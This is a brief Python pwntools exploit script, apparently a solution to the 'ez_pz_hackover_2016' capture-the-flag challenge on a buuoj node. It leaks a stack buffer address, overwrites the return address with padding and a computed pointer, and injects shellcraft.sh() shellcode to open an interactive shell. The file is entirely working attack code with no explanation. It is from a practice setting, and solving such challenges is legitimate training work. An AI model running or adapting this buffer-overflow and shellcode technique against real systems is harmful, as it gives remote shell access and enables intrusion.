from pwn import *
from LibcSearcher import *
context.log_level="debug"
context(log_level = "debug",arch = "i386",os = "linux")
p = remote('node4.buuoj.cn',28757)
#p =process("./ez_pz_hackover_2016")
buf_addr=int(p.recvuntil("W")[-12:-2],16)
print(buf_addr)
padding =50
#总长度
shellcode = asm(shellcraft.sh())#<-这里利用pwntools的asm()函数来写shellcode.
payload = b'crashme\x00'+b'M'*0x12 + p32(buf_addr-0x1c) + asm(shellcraft.sh())
p.sendlineafter(">",payload)
p.interactive()





